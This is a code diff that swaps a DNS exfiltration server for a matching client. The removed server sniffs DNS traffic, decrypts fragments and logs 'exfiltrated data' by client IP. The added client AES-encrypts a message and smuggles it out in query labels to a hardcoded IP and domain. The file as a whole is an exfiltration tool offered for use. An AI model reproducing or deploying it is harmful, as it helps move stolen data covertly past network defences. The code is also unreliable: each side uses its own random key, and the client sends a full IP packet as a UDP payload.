@@ -1,166 +1,129 @@
-from scapy.all import *
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
-import threading
+from scapy.all import *
 import base64
-import os
-import time
+import sys
 
-# Constants
-PORT = 53
-DOMAIN = "sub.brightbuys.me"  # Replace with your target domain
-SAVE_PATH = "./logs"  # Directory to save client logs
-
-# Dict to store client-specific data (AES keys, log file path, fragments)
-clients = {}
+# Configuration
+DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
+DNS_PORT = 53
+DOMAIN = 'sub.brightbuys.me'  # Replace with your target domain
+aes_key = get_random_bytes(32)  # Shared AES key
+aes_iv = get_random_bytes(16)  # IV for AES encryption
 
 
-# AES Encryption
+# AES encryption
 def encrypt_aes(data, key, iv):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
     return base64.b64encode(iv + encrypted_data).decode('utf-8')
 
 
-# AES Decryption
+# AES decryption
 def decrypt_aes(data, key):
+    data = base64.b64decode(data)
+    iv = data[:16]
+    encrypted_message = data[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
+    return decrypted_data.decode('utf-8')
+
+
+# Fragment message to fit within DNS label size limits
+def fragment_message(message, max_label_length=63):
+    """ Split message into chunks that fit into DNS labels. """
+    fragments = []
+    while message:
+        fragments.append(message[:max_label_length])
+        message = message[max_label_length:]
+
+    return fragments
+
+
+# Send DNS query based on the query type
+def send_dns_query(server_ip, query_pkt):
     try:
-        data = base64.b64decode(data)
-        iv = data[:16]
-        encrypted_message = data[16:]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
-        return decrypted_data.decode('utf-8')
-    except Exception as e:
-        print(f"Decryption error: {e}")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(5)
+
+        # Send the DNS query packet
+        sock.sendto(bytes(query_pkt), (server_ip, DNS_PORT))
+
+        # Receive the DNS response
+        response, _ = sock.recvfrom(1024)
+        return response
+
+    except socket.timeout:
+        print("Request timed out")
+    finally:
+        sock.close()
+
+
+# Craft DNS query based on the query type (TXT, CNAME, or A)
+def craft_dns_query(fragment, domain, query_type='TXT'):
+    # Ensure that fragment is not empty or improperly formatted
+    if not fragment:
+        print("Error: Empty fragment, skipping query")
         return None
 
+    # Construct the full DNS query string with the encrypted fragment and domain
+    full_query_name = f"{fragment}.{domain}."
 
-# Function to log client data to a file
-def log_client_data(client_ip, data):
-    timestamp = time.strftime("%Y%m%d-%H%M%S")
-    log_file = clients[client_ip]['log_file']
+    print(f"Sending DNS Query: {full_query_name}")
 
-    with open(log_file, 'a') as f:
-        f.write(f"[{timestamp}] {client_ip}: {data}\n")
-
-
-# Function to create a new client entry (AES key and log file)
-def create_new_client(client_ip):
-    aes_key = get_random_bytes(32)  # Generate a unique AES key for the client
-    log_file = os.path.join(SAVE_PATH, f"{client_ip}.log")  # Create a log file for the client
-
-    clients[client_ip] = {
-        'aes_key': aes_key,
-        'log_file': log_file,
-        'fragments': []  # Initialize empty fragment list for this client
-    }
-
-    print(f"New client detected: {client_ip}. AES key generated and log file created: {log_file}")
-
-
-# Function to check if all fragments are received (simple length check)
-def is_full_message_received(fragments):
-    # Implement your logic to check whether all fragments have been received
-    # Here we assume a fixed number of fragments for simplicity
-    return len(fragments) > 1  # Replace with real logic as needed
-
-
-# Function to handle DNS response based on the query type
-def forge_dns_response(pkt, rdata="", rcode=0):
-    d = pkt[IP].src
-    dp = pkt[UDP].sport
-    id = pkt[DNS].id
-    q = pkt[DNS].qd
-    reply = IP(dst=d) / UDP(dport=dp) / DNS(id=id, qr=1, rd=1, ra=1, rcode=rcode, qd=q)
-
-    # Handle different DNS query types (e.g., A, NS, TXT)
-    qtype = pkt[DNSQR].qtype
-    if qtype == 1:  # A record
-        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='A', ttl=60, rdata=rdata or "127.0.0.1")
-    elif qtype == 2:  # NS record
-        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='NS', ttl=3600, rdata=f"ns.{DOMAIN}")
-    elif qtype == 16:  # TXT record
-        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='TXT', ttl=60, rdata=rdata or "example response")
+    if query_type == 'TXT':
+        # TXT record query
+        dns_query = IP(dst=DNS_SERVER_IP) / UDP(dport=DNS_PORT) / DNS(rd=1,
+                                                                      qd=DNSQR(qname=full_query_name, qtype='TXT'))
+    elif query_type == 'CNAME':
+        # CNAME record query
+        dns_query = IP(dst=DNS_SERVER_IP) / UDP(dport=DNS_PORT) / DNS(rd=1,
+                                                                      qd=DNSQR(qname=full_query_name, qtype='CNAME'))
+    elif query_type == 'A':
+        # A record query
+        dns_query = IP(dst=DNS_SERVER_IP) / UDP(dport=DNS_PORT) / DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype='A'))
     else:
-        reply.rcode = 3  # NXDOMAIN for unsupported query types
+        raise ValueError("Unsupported DNS query type")
 
-    send(reply, verbose=0)
-
-
-# DNS Packet handler for processing client queries
-def handle_dns_packet(packet):
-    if packet.haslayer(DNS) and packet[DNS].opcode == 0:  # DNS query
-        print("This is packet:")
-        packet.show()
-
-        domain = packet[DNSQR].qname.decode().lower()
-        
-        print(f"domain: {domain}")
-
-        # Check if the labels are too long (DNS label limit is 63 characters)
-        labels = domain.split('.')
-        for label in labels:
-            if len(label) > 63:
-                print(f"Error: DNS label too long in {domain}")
-                return  # Skip further processing of this packet
-
-        client_ip = packet[IP].src
-
-        # If client is new, generate a new AES key and log file
-        if client_ip not in clients:
-            create_new_client(client_ip)
-
-        aes_key = clients[client_ip]['aes_key']
-
-        if DOMAIN in domain:
-            encrypted_fragment = domain.replace(f"{DOMAIN}", "")
-            
-            print(f"fragment: {encrypted_fragment}")
-            # Store fragments until the full message is received
-            clients[client_ip]['fragments'].append(encrypted_fragment)
-
-            # Assume some condition to check if all fragments have been received
-            if is_full_message_received(clients[client_ip]['fragments']):
-                full_message = ''.join(clients[client_ip]['fragments'])
-                decrypted_data = decrypt_aes(full_message, aes_key)
-                if decrypted_data:
-                    print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
-                    log_client_data(client_ip, decrypted_data)
-
-                    response_data = f"Received: {decrypted_data}"
-                    encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
-                    forge_dns_response(packet, rdata=encrypted_response)
-
-                clients[client_ip]['fragments'] = []  # Clear fragments after processing
-            else:
-                print(f"Waiting for more fragments from {client_ip}")
-        else:
-            print(f"Unrelated DNS request from {client_ip}: {domain}")
+    return dns_query
 
 
-# Start DNS packet listener in a separate thread
-def start_listener():
-    sniff(filter=f"udp port {PORT}", prn=handle_dns_packet)
-
-
-# Main function to start the multi-threaded DNS server
 if __name__ == "__main__":
-    # Create the log directory if it doesn't exist
-    os.makedirs(SAVE_PATH, exist_ok=True)
+    if len(sys.argv) < 3:
+        print("Usage: python3 client.py <message> <query_type>")
+        print("query_type: 'TXT', 'CNAME', or 'A'")
+        sys.exit(1)
 
-    print("Starting DNS exfiltration server...")
+    # Extract message and query type from the command line arguments
+    message_to_send = sys.argv[1]
+    query_type = sys.argv[2].upper()  # Ensure the query type is uppercase (TXT, CNAME, A)
 
-    # Start multi-threaded DNS packet listener
-    listener_thread = threading.Thread(target=start_listener)
-    listener_thread.daemon = True  # Run in the background
-    listener_thread.start()
+    if query_type not in ['TXT', 'CNAME', 'A']:
+        print("Error: query_type must be one of 'TXT', 'CNAME', or 'A'")
+        sys.exit(1)
 
-    # Main thread continues, allowing for other operations (e.g., user commands)
-    while True:
-        command = input("Enter 'quit' to stop the server: ")
-        if command == 'quit':
-            break
+    # Encrypt the message using AES
+    encrypted_message = encrypt_aes(message_to_send, aes_key, aes_iv)
+    print(f"Encrypted Message: {encrypted_message}")
 
-    print("Stopping the DNS exfiltration server...")
+    # Fragment the encrypted message to fit within DNS label limits
+    fragments = fragment_message(encrypted_message)
+
+    # Send each fragment as a separate DNS query
+    for fragment in fragments:
+        query_pkt = craft_dns_query(fragment, DOMAIN, query_type)
+        response = send_dns_query(DNS_SERVER_IP, query_pkt)
+
+        if response:
+            try:
+                # For now we assume that the response contains an encrypted message in the DNS answer
+                dns_response = DNS(response)
+                if dns_response.an and dns_response.an.rdata:
+                    encrypted_response = dns_response.an.rdata.decode()  # Decode the DNS answer
+                    decrypted_response = decrypt_aes(encrypted_response, aes_key)
+                    print(f"Decrypted Response: {decrypted_response}")
+                else:
+                    print("No valid response in DNS answer section")
+            except Exception as e:
+                print(f"Failed to decrypt response: {e}")
